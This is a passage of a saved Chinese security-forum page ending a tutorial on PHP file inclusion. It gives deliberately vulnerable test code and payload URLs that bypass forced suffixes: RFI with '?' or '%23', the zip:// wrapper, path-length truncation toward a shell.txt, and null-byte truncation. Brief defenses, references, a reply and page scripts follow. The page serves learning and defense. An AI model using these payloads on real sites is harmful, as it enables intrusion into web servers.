+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+ ..%c1%9c</li>
+</ul>
+<h2>指定后缀</h2>
+<p>接着考虑指定后缀的情况。测试代码:</p>
+<pre><code class="language-php">&lt;?php
+&nbsp;&nbsp;&nbsp;&nbsp;$file = $_GET['file'];
+&nbsp;&nbsp;&nbsp;&nbsp;include $file.'/test/test.php';
+?&gt;</code></pre>
+<h3>URL</h3>
+<p>url格式</p>
+<pre><code>protocol :// hostname[:port] / path / [;parameters][?query]#fragment</code></pre>
+<p>在远程文件包含漏洞（RFI）中，可以利用query或fragment来绕过后缀限制。</p>
+<p>姿势一：query（？）</p>
+<pre><code>index.php?file=http://remoteaddr/remoteinfo.txt?</code></pre>
+<p>则包含的文件为 <a href="http://remoteaddr/remoteinfo.txt?/test/test.php">http://remoteaddr/remoteinfo.txt?/test/test.php</a><br>
+问号后面的部分<code>/test/test.php</code>，也就是指定的后缀被当作query从而被绕过。<br>
+<img src="php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%7C%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6%20-%20%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%A4%BE%E5%8C%BA_files/19.png" alt=""></p>
+<p>姿势二：fragment（#）</p>
+<pre><code>index.php?file=http://remoteaddr/remoteinfo.txt%23</code></pre>
+<p>则包含的文件为 <a href="http://remoteaddr/remoteinfo.txt#/test/test.php">http://remoteaddr/remoteinfo.txt#/test/test.php</a><br>
+问号后面的部分<code>/test/test.php</code>，也就是指定的后缀被当作fragment从而被绕过。注意需要把<code>#</code>进行url编码为<code>%23</code>。<br>
+<img src="php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%7C%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6%20-%20%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%A4%BE%E5%8C%BA_files/20.png" alt=""></p>
+<h3>利用协议</h3>
+<p>前面有提到过利用zip协议和phar协议。假设现在测试代码为：</p>
+<pre><code class="language-php">&lt;?php
+&nbsp;&nbsp;&nbsp;&nbsp;$file = $_GET['file'];
+&nbsp;&nbsp;&nbsp;&nbsp;include $file.'/test/test.php';
+?&gt;</code></pre>
+<p>构造压缩包如下：<br>
+<img src="php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%7C%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6%20-%20%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%A4%BE%E5%8C%BA_files/21.png" alt=""></p>
+<p>其中test.php内容为：</p>
+<pre><code>&lt;?php phpinfo(); ?&gt;</code></pre>
+<p>利用zip协议，注意要指定绝对路径</p>
+<pre><code>index.php?file=zip://D:\phpStudy\WWW\fileinclude\chybeta.zip%23chybeta</code></pre>
+<p>则拼接后为：zip://D:\phpStudy\WWW\fileinclude\chybeta.zip#chybeta/test/test.php</p>
+<p><img src="php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%7C%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6%20-%20%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%A4%BE%E5%8C%BA_files/22.png" alt=""></p>
+<p>能成功包含。</p>
+<p>在利用phar协议的时候有些问题。哪位能指教一下？<br>
+<img src="php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%7C%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6%20-%20%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%A4%BE%E5%8C%BA_files/23.png" alt=""></p>
+<h3>长度截断</h3>
+<p>利用条件： php版本 &lt; php 5.2.8</p>
+<p>目录字符串，在linux下4096字节时会达到最大值，在window下是256字节。只要不断的重复<code>./</code></p>
+<pre><code>index.php?file=././././。。。省略。。。././shell.txt</code></pre>
+<p>则后缀<code>/test/test.php</code>，在达到最大值后会被直接丢弃掉。</p>
+<h3>0字节截断</h3>
+<p>利用条件： php版本 &lt; php 5.3.4</p>
+<pre><code>index.php?file=phpinfo.txt</code></pre>
+<p><img src="php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%7C%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6%20-%20%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%A4%BE%E5%8C%BA_files/24.png" alt=""></p>
+<p>能利用00截断的场景现在应该很少了：）</p>
+<h1>防御方案</h1>
+<ol>
+<li>在很多场景中都需要去包含web目录之外的文件，如果php配置了open_basedir，则会包含失败</li>
+<li>做好文件的权限管理</li>
+<li>对危险字符进行过滤等等</li>
+</ol>
+<h1>Refference</h1>
+<ul>
+<li>《白帽子讲Web安全》</li>
+<li><a href="https://dustri.org/b/from-lfi-to-rce-in-php.html">From LFI to RCE in php </a></li>
+<li><a href="http://www.cnblogs.com/iamstudy/articles/include_file.html">l3m0n: 文件包含漏洞小结</a></li>
+<li><a href="https://highon.coffee/blog/lfi-cheat-sheet/">LFI Cheat Sheet</a></li>
+<li><a href="https://github.com/lucyoa/ctf-wiki/tree/master/web/file-inclusion">Local File Inclusion</a></li>
+<li><a href="https://chybeta.github.io/2017/10/08/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/">chybeta: php文件包含漏洞</a></li>
+</ul>
+<p>这是我在学习php文件包含漏洞过程中总结的一些姿势。若有不对的地方或有更好的姿势等，希望各位大牛指出。谢谢各位。</p></main></div>
+                    </div>
+
+		
+<!--content_read-->
+                </td>
+            </tr>
+            <tr>
+                <td class="floot_bottom">
+<!--评分-->
+		<div id="mark_tpc" class="score cc mb10" style="display:none">
+<div class="scoreTop">
+	<span class="b">本帖最近评分记录：</span>
+	<span class="mr10">
+		共 <span class="s2" id="pingNum_tpc"></span> 条评分
+	</span>
+</div>
+<div class="scoreContent">
+              <div id="createpingbox_tpc"></div>
+	<table style="table-layout:fixed;" width="100%">
+		<tbody id="pingPage_tpc" style="">
+		</tbody>
+	</table>
+</div>
+<input id="pingPageNum_tpc" value="2" type="hidden">
+<script language="javascript">
+getObj('pingPageNum_tpc').value = 2;
+</script>
+<div class="p10 cc">
+	<a id="pingHide_tpc" href="javascript:void(0);" onclick="pingHideCtrl('tpc');">隐藏</a>
+</div>
+		</div>
+		<div id="w_tpc" class="c"></div>
+<!--评分结束-->
+<div class="userOper">
+
+
+</div>
+<div class="shareAll cc mb10">
+	<em>分享到</em>
+	<a href="javascript:void(0)" onclick="window.open('http://share.jianghu.taobao.com/share/addShare.htm?title='+encodeURIComponent(document.title.substring(0,76))+'&amp;url='+encodeURIComponent(location.href)+'&amp;content=','_blank','scrollbars=no,width=600,height=450,left=75,top=20,status=no,resizable=yes'); void 0" title="淘江湖">淘江湖</a>
+	<a href="javascript:(function(){window.open('http://v.t.sina.com.cn/share/share.php?title='+encodeURIComponent(document.title)+'&amp;url='+encodeURIComponent(location.href)+'&amp;source=bookmark','_blank','width=450,height=400');})()" title="新浪微博" style="background-position:0 -20px;">新浪</a>
+	<a href="javascript:void(0)" onclick="window.open( 'http://v.t.qq.com/share/share.php?url='+encodeURIComponent(document.location)+'&amp;appkey=&amp;site=&amp;title='+encodeURI(document.title),'', 'width=700, height=680, top=0, left=0, toolbar=no, menubar=no, scrollbars=no, location=yes, resizable=no, status=no' );" title="QQ微博" style="background-position:0 -40px;">QQ微博</a>
+	<a href="javascript:void(0);" onclick="window.open('http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url='+encodeURIComponent(document.location.href));return false;" title="QQ空间" style="background-position:0 -60px;">QQ空间</a>
+	<a href="javascript:d=document;t=d.selection?(d.selection.type!='None'?d.selection.createRange().text:''):(d.getSelection?d.getSelection():'');void(kaixin=window.open('http://www.kaixin001.com/~repaste/repaste.php?&amp;rurl='+escape(d.location.href)+'&amp;rtitle='+escape(d.title)+'&amp;rcontent='+escape(d.title),'kaixin'));kaixin.focus();" title="开心" style="background-position:0 -80px;">开心</a>
+	<a href="javascript:void((function(s,d,e){if(/renren\.com/.test(d.location))return;var%20f='http://share.renren.com/share/buttonshare?link=',u=d.location,l=d.title,p=[e(u),'&amp;title=',e(l)].join('');function%20a(){if(!window.open([f,p].join(''),'xnshare',['toolbar=0,status=0,resizable=1,width=626,height=436,left=',(s.width-626)/2,',top=',(s.height-436)/2].join('')))u.href=[f,p].join('');};if(/Firefox/.test(navigator.userAgent))setTimeout(a,0);else%20a();})(screen,document,encodeURIComponent));" title="人人" style="background-position:0 -100px;">人人</a>
+	<a href="javascript:void(function(){var%20d=document,e=encodeURIComponent,s1=window.getSelection,s2=d.getSelection,s3=d.selection,s=s1?s1():s2?s2():s3?s3.createRange().text:'',r='http://www.douban.com/recommend/?url='+e(d.location.href)+'&amp;title='+e(d.title)+'&amp;sel='+e(s)+'&amp;v=1',x=function(){if(!window.open(r,'douban','toolbar=0,resizable=1,scrollbars=yes,status=1,width=450,height=330'))location.href=r+'&amp;r=1'};if(/Firefox/.test(navigator.userAgent)){setTimeout(x,0)}else{x()}})()" title="豆瓣" style="background-position:0 -120px;">豆瓣</a>
+	<a onclick="(function(){var url = 'link=http://news.163.com/&amp;source='+ encodeURIComponent('网易新闻')+ '&amp;info='+ encodeURIComponent(document.title) + ' ' + encodeURIComponent(document.location.href);window.open('http://t.163.com/article/user/checkLogin.do?'+url+'&amp;'+new Date().getTime(),'newwindow','height=330,width=550,top='+(screen.height-280)/2+',left='+(screen.width-550)/2+', toolbar=no, menubar=no, scrollbars=no,resizable=yes,location=no, status=no');})()" href="javascript:void(0);" title="网易微博" style="background-position:0 -140px;">网易微博</a>
+	<a href="javascript:void(0);" onclick="window.open('http://apps.hi.baidu.com/share/?title='+encodeURIComponent(document.title.substring(0,76))+'&amp;url='+encodeURIComponent(location.href));return false;" title="百度空间" style="background-position:0 -180px;">百度</a>
+	<a href="javascript:void(0);" onclick="window.open('http://xianguo.com/service/submitfav/?link='+encodeURIComponent(location.href)+'&amp;title='+encodeURIComponent(document.title));return false;" title="鲜果" style="background-position:0 -200px;">鲜果</a>
+	<a href="javascript:void(0);" onclick="window.open('http://bai.sohu.com/share/blank/add.do?link='+encodeURIComponent(location.href)+'&amp;title='+encodeURIComponent(document.title));return false;" title="白社会" style="background-position:0 -220px;">白社会</a>
+	<a href="javascript:void(0);" onclick="window.open('http://space.feixin.10086.cn/api/share?title='+encodeURIComponent(document.title)+'&amp;url='+encodeURIComponent(location.href));return false;" title="飞信" style="background-position:0 -240px;">飞信</a>
+</div>
+           <div class="mb20 cc post-oper">
+<div class="fl readbot">
+	<a class="r-reply" title="回复此楼" href="javascript:;" onclick="postreply('回 楼主(chybeta) 的帖子');">回复</a>
+	<a class="r-quote" href="https://xianzhi.aliyun.com/forum/post.php?action=quote&amp;fid=4&amp;tid=2204&amp;pid=tpc&amp;article=0&amp;page=1" onclick="return sendurl(this,4,'',event)" id="quote_tpc" title="" rel="nofollow">引用</a>
+</div>
+<div class="fr">
+	<a onclick="sendmsg('https://xianzhi.aliyun.com/forum/pw_ajax.php?action=report&amp;type=topic&amp;tid=2204&amp;pid=tpc','',this.id);" title="举报此帖" href="javascript:;" class="mr5">举报</a>
+</div>
+             </div>
+                </td>
+            </tr>
+        </tbody></table>
+	</div>
+	<table class="flootbg" width="100%"><tbody><tr><td>
+	</td></tr></tbody></table>
+	<a name="a"></a><a name="6632"></a>
+	<div class="read_t" id="readfloor_6632">
+		<table class="floot" width="100%">
+<tbody><tr class="vt">
+	<td rowspan="2" class="floot_left">
+		<div class="floot_leftdiv">
+<div class="readFace">
+	<div class="fl">
+		<div class="card" style="display:none" id="readFace_1" onmouseover="this.style.display='';" onmouseout="this.style.display='none';">
+<dl class="cc">
+	<dt class="fl">
+		<div class="cc"><a rel="nofollow" href="https://xianzhi.aliyun.com/forum/u.php?uid=1097807788961615" class="face_img"><img class="pic" src="php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%7C%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6%20-%20%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%A4%BE%E5%8C%BA_files/2.jpg" border="0" width="120" height="120"></a></div>
+		<p>UID：1097807788961615</p>
+	</dt>
+	<dd class="ddA">
+		<ul class="cc half">
+<li><span>注册时间</span>2017-10-12</li>
+<li><span>最后登录</span>2017-10-17</li>
+<li><span>在线时间</span>2小时</li>
+		</ul>
+	</dd>
+	<dd class="ddA">
+		<ul class="cc half">
+<li><span>发帖</span>1</li>
+<li><a href="https://xianzhi.aliyun.com/forum/apps.php?q=article&amp;uid=1097807788961615" target="_blank">搜Ta的帖子</a></li>
+<li><span>精华</span>0
+</li>
+<li class="cc"><span>积分</span>1</li><li class="cc"><span>威望</span>0</li><li class="cc"><span>贡献值</span>0</li><li class="cc"><span>人民币</span>0</li>
+		</ul>
+	</dd>
+	<dd class="ddB">
+		<a href="https://xianzhi.aliyun.com/forum/u.php?uid=1097807788961615" class="add_home">访问TA的空间</a><a href="javascript:;" onclick="sendmsg('https://xianzhi.aliyun.com/forum/pw_ajax.php?action=addfriend&amp;touid=1097807788961615')" class="add_fri">加好友</a><a href="javascript:;" onclick="sendmsg('https://xianzhi.aliyun.com/forum/pw_ajax.php?action=usertool&amp;uid=1097807788961615')" class="add_pro">用道具</a>
+	</dd>
+</dl>
+		</div>
+	</div>
+</div>
+<a href="https://xianzhi.aliyun.com/forum/u.php?uid=1097807788961615" id="card_sf_6632_1097807788961615" class="userCard face_img">
+<img onmouseover="readFace.show('readFace_1');" onmouseout="readFace.clear()" class="pic" src="php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%7C%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6%20-%20%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%A4%BE%E5%8C%BA_files/2.jpg" border="0" width="120" height="120">
+</a>
+
+
+<div class="author"><img src="php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%7C%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6%20-%20%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%A4%BE%E5%8C%BA_files/stealth.png" title="离线" align="absmiddle"><a rel="nofollow" href="https://xianzhi.aliyun.com/forum/u.php?uid=1097807788961615">pandamq</a></div><div class="readLevel mb5">
+	<span>级别: <a rel="nofollow" href="https://xianzhi.aliyun.com/forum/profile.php?action=permission&amp;gid=8">P5_安全攻城狮</a>
+	</span>
+	<!-- 新的星级
+	<div class="star">
+		<div style="width:100%"></div>
+	</div>
+	-->
+
+	<img src="php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%7C%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6%20-%20%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%A4%BE%E5%8C%BA_files/1.gif">
+
+</div>
+<div class="readUser_info cc mb10">
+	<ul class="two cc">
+		<li><a href="javascript:;" onclick="Attention.add(this,'1097807788961615',0)" class="add_fol">加关注</a></li>
+		<li><a href="javascript:;" onclick="sendmsg('https://xianzhi.aliyun.com/forum/pw_ajax.php?action=msg&amp;touid=1097807788961615');" class="add_mes">写私信</a></li>
+	</ul>
+</div>
+
+<div></div>
+		</div>
+	</td>
+	<td class="floot_right" id="td_6632"><a name="post_6632"></a>
+<!--印戳-->
+<!--楼层信息及编辑-->
+		<div class="tipTop s6">
+<span class="fr">
+	<a href="javascript:;" onclick="window.location=('https://xianzhi.aliyun.com/forum/read/2204.html?uid=1097807788961615&amp;displayMode=1');return false;" title="只看该作者的所有回复" class="mr5 s6">只看该作者</a>
+</span>
+<a class="s2 b cp" onclick="copyFloorUrl('6632')" title="复制此楼地址">沙发</a>&nbsp;&nbsp;<span title="2017-10-12 14:18:36">发表于: 10-12</span>
+                    </div>
+		<div class="read_h1" style="margin-bottom:10px;" id="subject_6632">Rephp文件包含漏洞</div>
+<!--帖子顶部ad-->
+<!--管理提醒-->
+<!--活动参加按钮-->
+<div id="p_6632"></div>
+<!--帖子右侧（广告/动漫表情）-->
+		<div class="readCon_right tar">
+		</div>
+<!--content_read-->
+                <div class="tpc_content">
+                    <div class="f14 mb10" id="read_6632">
+                        干货，顶一下子:0
+                    </div>
+		</div>
+<!--content_read-->
+                </td>
+            </tr>
+            <tr>
+                <td class="floot_bottom">
+<!--评分-->
+		<div id="mark_6632" class="score cc mb10" style="display:none">
+<div class="scoreTop">
+	<span class="b">本帖最近评分记录：</span>
+	<span class="mr10">
+		共 <span class="s2" id="pingNum_6632"></span> 条评分
+	</span>
+</div>
+<div class="scoreContent">
+              <div id="createpingbox_6632"></div>
+	<table style="table-layout:fixed;" width="100%">
+		<tbody id="pingPage_6632" style="">
+		</tbody>
+	</table>
+</div>
+<input id="pingPageNum_6632" value="2" type="hidden">
+<script language="javascript">
+getObj('pingPageNum_6632').value = 2;
+</script>
+<div class="p10 cc">
+	<a id="pingHide_6632" href="javascript:void(0);" onclick="pingHideCtrl('6632');">隐藏</a>
+</div>
+		</div>
+		<div id="w_6632" class="c"></div>
+<!--评分结束-->
+           <div class="mb20 cc post-oper">
+<div class="fl readbot">
+	<a class="r-reply
+	" title="回复此楼" href="javascript:;" onclick="postreply('回 1楼(pandamq) 的帖子');">回复</a>
+	<a class="r-quote" href="https://xianzhi.aliyun.com/forum/post.php?action=quote&amp;fid=4&amp;tid=2204&amp;pid=6632&amp;article=1&amp;page=1" onclick="return sendurl(this,4,'',event)" id="quote_6632" title="引用回复这个帖子" rel="nofollow">引用</a>
+
+</div>
+<div class="fr">
+	<a onclick="sendmsg('https://xianzhi.aliyun.com/forum/pw_ajax.php?action=report&amp;type=topic&amp;tid=2204&amp;pid=6632','',this.id);" title="举报此帖" href="javascript:;" class="mr5">举报</a>
+</div>
+             </div>
+                </td>
+            </tr>
+        </tbody></table>
+	</div>
+<table class="flootbg" width="100%"><tbody><tr><td>
+</td></tr></tbody></table>
+	</form>
+</div>
+<!--发帖回复-->
+<div class="cc mb10" id="bottomFastpost">
+	<a href="https://xianzhi.aliyun.com/forum/post.php?fid=4" class="fr y-btn y-btn-white" id="td_post" title="发帖" rel="nofollow">发表主题</a>
+	<a href="https://xianzhi.aliyun.com/forum/post.php?action=reply&amp;fid=4&amp;tid=2204" class="fr mr10 y-btn" rel="nofollow">回复主题</a>
+	<div style="padding-top:3px;"><span class="pages"><a href="https://xianzhi.aliyun.com/forum/thread/4.html" class="w">«&nbsp;返回列表</a></span><span class="fl"></span><span class="pages"><a href="https://xianzhi.aliyun.com/forum/link.php?action=previous&amp;fid=4&amp;tid=2204&amp;fpage=2&amp;goto=previous" rel="nofollow">上一主题</a><a href="https://xianzhi.aliyun.com/forum/link.php?action=previous&amp;fid=4&amp;tid=2204&amp;fpage=2&amp;goto=next" rel="nofollow">下一主题</a></span></div>
+</div>
+<!--链接提醒-->
+<div id="checkurl" class="popout" style="display:none;"><table cellspacing="0" cellpadding="0" border="0"><tbody><tr><td class="bgcorner1"></td><td class="pobg1"></td><td class="bgcorner2"></td></tr><tr><td class="pobg4"></td><td><div class="popoutContent">
+	<div class="popTop" id="suburl">https://xianzhi.aliyun.com/forum</div>
+	<div class="p10">访问内容超出本站范围，不能确定是否安全</div>
+	<div class="popBottom">
+		<span class="btn2"><span><button type="button" id="trueurl">继续访问</button></span></span>
+		<span class="bt2"><span><button type="button" onclick="closep();">取消访问</button></span></span>
+	</div>
+</div></td><td class="pobg2"></td></tr><tr><td class="bgcorner4"></td><td class="pobg3"></td><td class="bgcorner3"></td></tr></tbody></table></div>
+<script language="JavaScript">
+var tid = '2204';
+var fid = '4';
+var mt;
+var totalpage = parseInt('1');
+var db_ajax = '0';
+var page = parseInt('1');
+var jurl = 
+'read/2204.html?fpage=2&displayMode=1&toread=0&fpage=2&page=';
+var db_htmifopen = '1';
+var db_dir = '.php?';
+var db_ext = '.html';
+var db_bbsurl = 'https://xianzhi.aliyun.com/forum';
+var copyurl = 
+'php文件包含漏洞|https://xianzhi.aliyun.com/forum/read
+/2204.html?displayMode=1' + (page > 1 ? '&page=' + page : '') + 
+'&'+'u=';
+var db_urlcheck = 'xianzhi.ailyun.com';
+//window.onReady(userCard.init);
+
+/*pingpage*/
+function showPingPage(fid, tid, pid) {
+	if (getObj('pingPage_'+pid).style.display == "none") {
+		pingHideCtrl(pid);
+	}
+	var pingPageNum = getObj('pingPageNum_'+pid).value * 1;
+	
+ajax.send("https://xianzhi.aliyun.com/forum/pw_ajax.php?action=pingpage",
+ "page="+pingPageNum+"&fid="+fid+"&tid="+tid+"&pid="+pid, function(){
+		var gotText = ajax.request.responseText;
+
+		var trs=gotText.split("<!-- splitTr -->");
+		var tr, td, trData, pingId, pingIdMatch;
+		for(var i=1,len=trs.length;i<len;i++) {
+pingIdMatch = trs[i].match(/<\!\-\- pingId\:(\d+) \-\->/i);
+pingId = pingIdMatch[1];
+trData = trs[i].split("<!-- split -->");
+
+tr = document.createElement("tr");
+tr.id = 'pingLogTr_' + pingId;
+tr.onmouseover = function() {showPingDelLink(this, true)};
+tr.onmouseout = function() {showPingDelLink(this, false)};
+td = document.createElement("th");
+td.innerHTML = trData[0];
+tr.appendChild(td);
+
+for(var j=1; j<=6; j++) {
+	td = document.createElement("td");
+	td.innerHTML = trData[j];
+	tr.appendChild(td);
+}
+getObj('pingPage_'+pid).appendChild(tr);
+		}
+		if (gotText.indexOf('__pingPageOver__') != -1) { 
+getObj('pingMore_'+pid).style.display='none';return ;}
+	});
+	getObj('pingPageNum_'+pid).value = pingPageNum + 1;
+}
+function delPingLog(fid, tid, pid, pingid) {
+	
+showDialog({type:'confirm',message:"你确定要删除这条评分动态么？",okText:'确认
+',onOk:function(){
+		read.obj = getObj("pingDel_"+pingid);
+		read.guide();
+		
+ajax.send("https://xianzhi.aliyun.com/forum/pw_ajax.php?action=delpinglog",
+ "fid="+fid+"&tid="+tid+"&pid="+pid+"&pingid="+pingid, function(){
+if (ajax.request.responseText == 'success') {
+	showDialog('success','删除评分动态成功！');
+
+	if (getObj('pingLogTr_'+pingid)) {
+		getObj('pingLogTr_'+pingid).style.display = "none";
+	}
+
+	if (getObj('createpingLogTr_'+pingid)) {
+		getObj('createpingLogTr_'+pingid).style.display = "none";
+	}
+	if ($('pingNum_'+pid)) {
+		var pingNums = $('pingNum_'+pid);
+		pingNums.innerHTML  = parseInt(pingNums.innerHTML) - 1;
+	}
+
+} else {
+		showDialog('error','删除评分动态出错！');
+}
+		});
+	}});
+}
+function showPingDelLink(trObj, isShow) {
+	pingId = trObj.id.match(/\d+/i);
+	linkObj = getObj("pingDel_"+pingId);
+	if (linkObj) {
+		linkObj.style.display = isShow ? '' : 'none';
+	}
+}
+function pingHideCtrl(pid) {
+	if (getObj('pingPage_'+pid).style.display == "") {
+		getObj('pingPage_'+pid).style.display = "none";
+		getObj('createpingbox_'+pid).style.display = "none";
+		getObj('pingHide_'+pid).innerHTML = "显示";
+		SetCookie('read_hidepinglog', 1);
+	} else {
+		getObj('pingPage_'+pid).style.display = "";
+		getObj('createpingbox_'+pid).style.display = "";
+		getObj('pingHide_'+pid).innerHTML = "隐藏";
+		SetCookie('read_hidepinglog', 0);
+	}
+}
+function copyFloorUrl(o) {
+	var floorurl = 
+'https://xianzhi.aliyun.com/forum/read/2204.html?displayMode=1' + (page >
+ 1 ? '&page=' + page : '') + '#';
+	if (is_ie) {
+		window.clipboardData.setData("Text",floorurl+o);
+		showDialog('success','已成功复制',1);
+	} else {
+		prompt('按下 Ctrl+C 复制到剪贴板', floorurl+o)
+	}
+}
+
+//if(is_webkit)
+	
+//getObj('bookmarkExplore').parentNode.removeChild(getObj('bookmarkExplore'));
+
+
+</script>
+<script type="text/javascript" language="JavaScript" src="php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%7C%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6%20-%20%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%A4%BE%E5%8C%BA_files/pw_lwd.js"></script>
+
+<!--快速版块浏览-->
+<div id="menu_forumlist" style="display:none;">
+	<div class="sbar-box-a" style="width:700px;">
+		<div class="sbar-title" style="cursor:pointer" onclick="try{pw_bottom.hiddenTab();read.close();}catch(e){read.close();}">
+	<span class="adel">隐藏</span>
+	<span id="title_forumlist" class="b">快速跳转</span>
+		</div>
+		<div class="sbar-box-b">
+<div class="forum-list-popout">
+<dl class="cc">
+	<dt>
+	<a href="https://xianzhi.aliyun.com/forum/index.php?cateid=3">技术研究</a>
+	</dt>
+	<dd class="cc">
+		<a href="https://xianzhi.aliyun.com/forum/thread/4.html" onclick="return pwForumList(true,gIsPost,4);"><span>漏洞研究</span></a>
+		<a href="https://xianzhi.aliyun.com/forum/thread/5.html" onclick="return pwForumList(true,gIsPost,5);"><span>安全工具</span></a>
+		<a href="https://xianzhi.aliyun.com/forum/thread/6.html" onclick="return pwForumList(true,gIsPost,6);"><span>黑产分析</span></a>
+		<a href="https://xianzhi.aliyun.com/forum/thread/7.html" onclick="return pwForumList(true,gIsPost,7);"><span>行业资讯</span></a>
+		<a href="https://xianzhi.aliyun.com/forum/thread/8.html" onclick="return pwForumList(true,gIsPost,8);"><span>先知众测</span></a>
+		<a href="https://xianzhi.aliyun.com/forum/thread/14.html" onclick="return pwForumList(true,gIsPost,14);"><span>技术讨论</span></a>
+	</dd>
+</dl>
+<dl class="cc">
+	<dt>
+	<a href="https://xianzhi.aliyun.com/forum/index.php?cateid=9">招聘&amp;灌水</a>
+	</dt>
+	<dd class="cc">
+		<a href="https://xianzhi.aliyun.com/forum/thread/15.html" onclick="return pwForumList(true,gIsPost,15);"><span>公司招聘</span></a>
+		<a href="https://xianzhi.aliyun.com/forum/thread/13.html" onclick="return pwForumList(true,gIsPost,13);"><span>社区漏洞测试</span></a>
+		<a href="https://xianzhi.aliyun.com/forum/thread/10.html" onclick="return pwForumList(true,gIsPost,10);"><span>灌水乐园</span></a>
+	</dd>
+</dl>
+<dl class="cc">
+	<dt>
+	<a href="https://xianzhi.aliyun.com/forum/index.php?cateid=11">站务公告</a>
+	</dt>
+	<dd class="cc">
+		<a href="https://xianzhi.aliyun.com/forum/thread/12.html" onclick="return pwForumList(true,gIsPost,12);"><span>站务公告</span></a>
+	</dd>
+</dl>
+</div>
+		</div>
+	</div>
+</div>
+<div id="photo_pop_mask" onclick="readImg.hidePhoto()" class="pImg_bg" style="display:none"></div></div>
+<div id="photo_pop" class="pImg_wrap" style="display:none"><table cellspacing="0" cellpadding="0" border="0"><tbody><tr><td class="bcr1"></td><td class="pibg1"></td><td class="bcr2"></td></tr><tr><td class="pibg4"></td><td><div class="pImg tac">
+<div id="imgLoading" class="imgLoading" style="margin:auto;">
+<div class="aPre" id="prephoto" onclick="readImg.prevPhoto()" title="上一张"></div>
+<div class="aNext" id="nextphoto" onclick="readImg.nextPhoto()" title="下一张"></div>
+<img id="photo_path" src="php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%7C%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6%20-%20%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%A4%BE%E5%8C%BA_files/watermark.jpg" align="absmiddle">
+</div>
+<div class="cc w" style="padding:10px 5px 5px;">
+	<div class="fl mr10" id="photo_pop_page"></div><!--a href="javascript:;" class="fl mr20" onclick="readImg.viewAll()">原图</a-->
+	<a href="javascript://" class="pImg_close" onclick="readImg.hidePhoto()">关闭</a>
+</div>
+</div></td><td class="pibg2"></td></tr><tr><td class="bcr4"></td><td class="pibg3"></td><td class="bcr3"></td></tr></tbody></table></div>
+
+<!--.main-wrap,#main End-->
+
+<script src="php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%7C%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6%20-%20%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%A4%BE%E5%8C%BA_files/z_stat.js" language="JavaScript"></script>
+
+<script language="JavaScript" src="php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%7C%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6%20-%20%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%A4%BE%E5%8C%BA_files/global.js"></script>
+
+<script language="JavaScript" src="php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%7C%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6%20-%20%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%A4%BE%E5%8C%BA_files/app_global.js"></script>
+<script language="JavaScript" src="php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%7C%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6%20-%20%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%A4%BE%E5%8C%BA_files/Cookie.js"></script>
+<script language="JavaScript">
+var openmenu = {'td_sort' : 'menu_sort','td_skin' : 
+'menu_skin','td_post' : 'menu_post','td_post1' : 'menu_post','td_admin' :
